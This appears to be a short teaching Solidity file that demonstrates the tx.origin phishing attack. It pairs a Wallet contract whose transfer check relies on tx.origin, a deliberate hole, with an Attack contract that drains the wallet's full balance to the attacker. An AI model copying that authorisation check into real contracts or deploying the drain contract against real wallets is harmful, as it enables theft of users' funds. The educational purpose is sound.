
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

//this code shows how tx.origin attact perform
//tx.origin ==> return the address of who initiated the transection

contract Wallet {
    address public owner;

    constructor() {
        owner= msg.sender;
    }

    function deposit() public payable {
    }
    function transfer(address payable _to, uint _amount) public {
        require(tx.origin==owner,"you are not owner");
        (bool sent,) = _to.call{value: _amount}("");
        require(sent, "Fail to send the ether!!");
    }
    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}

//the actual attact contract starts here
contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet){
        owner= payable (msg.sender);
        wallet =  Wallet(_wallet);
    }
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }

}